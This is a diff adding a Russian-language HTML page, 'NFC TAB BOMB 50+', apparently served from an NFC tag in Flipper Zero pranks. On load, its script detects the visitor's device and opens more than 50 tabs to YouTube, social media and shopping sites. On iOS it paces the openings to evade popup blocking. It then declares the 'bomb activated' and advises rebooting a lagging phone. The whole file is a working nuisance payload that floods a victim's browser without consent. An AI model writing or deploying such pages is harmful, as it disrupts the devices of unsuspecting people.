@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ NFC BOMB 50+ TABS</title>
+    <style>
+        body {
+            background: black;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            padding: 20px;
+        }
+        .counter {
+            font-size: 72px;
+            margin: 50px;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        .status {
+            font-size: 24px;
+            margin: 20px;
+            color: #ffff00;
+        }
+        .device {
+            font-size: 18px;
+            color: #00ffff;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        .blink {
+            animation: blink 1s infinite;
+        }
+    </style>
+</head>
+<body>
+    <h1 class="blink">⚡ NFC TAB BOMB 50+ ⚡</h1>
+    
+    <div class="counter" id="counter">0</div>
+    <div class="status" id="status">ИНИЦИАЛИЗАЦИЯ...</div>
+    <div class="device" id="device"></div>
+    
+    <script>
+        // МАССИВ ИЗ 50+ URL (реальные сайты)
+        const urls = [
+            // ВИДЕО (10 шт)
+            'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+            'https://www.youtube.com/watch?v=jNQXAC9IVRw',
+            'https://www.youtube.com/watch?v=9bZkp7q19f0',
+            'https://www.youtube.com/watch?v=opZ69P-0Jbc',
+            'https://www.youtube.com/watch?v=kJQP7kiw5Fk',
+            'https://www.youtube.com/watch?v=RgKAFK5djSk',
+            'https://www.youtube.com/watch?v=JGwWNGJdvx8',
+            'https://www.youtube.com/watch?v=CevxZvSJLk8',
+            'https://www.youtube.com/watch?v=QH2-TGUlwu4',
+            'https://www.youtube.com/watch?v=fRh_vgS2dFE',
+            
+            // СОЦСЕТИ (10 шт)
+            'https://www.instagram.com',
+            'https://www.facebook.com',
+            'https://www.tiktok.com/@flipperzero',
+            'https://twitter.com/flipper_zero',
+            'https://www.reddit.com/r/flipperzero',
+            'https://www.pinterest.com/search/pins/?q=flipper%20zero',
+            'https://www.tumblr.com/search/flipper+zero',
+            'https://www.snapchat.com/add/flipper_zero',
+            'https://www.linkedin.com/search/results/all/?keywords=flipper%20zero',
+            'https://t.me/s/flipper_zero',
+            
+            // ПОИСКОВИКИ (5 шт)
+            'https://www.google.com/search?q=flipper+zero+nfc+bomb',
+            'https://www.bing.com/search?q=flipper+zero+bluetooth+spam',
+            'https://duckduckgo.com/?q=flipper+zero+sub+ghz',
+            'https://yandex.ru/search/?text=flipper+zero+прошивка',
+            'https://www.baidu.com/s?wd=flipper+zero',
+            
+            // МАГАЗИНЫ (5 шт)
+            'https://www.amazon.com/s?k=flipper+zero',
+            'https://www.ebay.com/sch/i.html?_nkw=flipper+zero',
+            'https://www.aliexpress.com/wholesale?SearchText=flipper+zero',
+            'https://shop.flipperzero.one',
+            'https://lab401.com/collections/flipper-zero',
+            
+            // НОВОСТИ (5 шт)
+            'https://www.cnn.com/search?q=flipper+zero',
+            'https://www.bbc.co.uk/search?q=flipper+zero',
+            'https://www.theverge.com/search?q=flipper+zero',
+            'https://www.wired.com/search?q=flipper+zero',
+            'https://hackaday.com/blog/?s=flipper+zero',
+            
+            // ФОРУМЫ (5 шт)
+            'https://github.com/flipperdevices/flipperzero-firmware',
+            'https://stackoverflow.com/questions/tagged/flipper-zero',
+            'https://en.wikipedia.org/wiki/Flipper_Zero',
+            'https://www.etsy.com/search?q=flipper+zero',
+            'https://www.kickstarter.com/projects/flipper-devices/flipper-zero',
+            
+            // ДОПОЛНИТЕЛЬНЫЕ (10 шт)
+            'https://flipperzero.one',
+            'https://docs.flipperzero.one',
+            'https://forum.flipperzero.one',
+            'https://twitter.com/flipper_zero',
+            'https://www.instagram.com/flipper_zero',
+            'https://www.tiktok.com/@flipperzero',
+            'https://discord.gg/flipper',
+            'https://www.reddit.com/r/flipperzero',
+            'https://github.com/flipperdevices',
+            'https://flipperzero.one/downloads'
+        ];
+        
+        let openedTabs = 0;
+        const counterEl = document.getElementById('counter');
+        const statusEl = document.getElementById('status');
+        const deviceEl = document.getElementById('device');
+        
+        // Определение устройства
+        const ua = navigator.userAgent;
+        let device = 'Неизвестно';
+        let isIOS = false;
+        let isAndroid = false;
+        
+        if (/iPad|iPhone|iPod/.test(ua)) {
+            device = '🍎 iOS';
+            isIOS = true;
+        } else if (/Android/.test(ua)) {
+            device = '🤖 Android';
+            isAndroid = true;
+        } else {
+            device = '💻 Desktop';
+        }
+        
+        deviceEl.textContent = `Устройство: ${device}`;
+        
+        // Функция обновления счетчика
+        function updateCounter() {
+            counterEl.textContent = openedTabs;
+            statusEl.textContent = `Открыто ${openedTabs} из ${urls.length} вкладок`;
+            
+            if (openedTabs >= urls.length) {
+                statusEl.innerHTML = '✅ БОМБА АКТИВИРОВАНА! ✅<br>Перезагрузи телефон если тормозит';
+                statusEl.style.color = '#ff0000';
+            }
+        }
+        
+        // Функция открытия вкладок
+        function openTabs() {
+            statusEl.textContent = 'ЗАПУСК...';
+            
+            if (isIOS) {
+                // iOS: открываем медленно (иначе блокирует)
+                statusEl.textContent = 'iOS режим: открываем по одной...';
+                let index = 0;
+                
+                function openNext() {
+                    if (index < urls.length) {
+                        window.open(urls[index], '_blank');
+                        openedTabs++;
+                        updateCounter();
+                        index++;
+                        setTimeout(openNext, 800); // 800ms между открытиями
+                    }
+                }
+                openNext();
+                
+            } else {
+                // Android/Desktop: открываем быстро
+                statusEl.textContent = 'БЫСТРЫЙ РЕЖИМ: открываем все...';
+                
+                for (let i = 0; i < urls.length; i++) {
+                    setTimeout(() => {
+                        window.open(urls[i], '_blank');
+                        openedTabs++;
+                        updateCounter();
+                    }, i * 100); // 100ms между открытиями
+                }
+            }
+        }
+        
+        // Автозапуск через 1 секунду
+        setTimeout(openTabs, 1000);
+    </script>
+</body>
+</html>
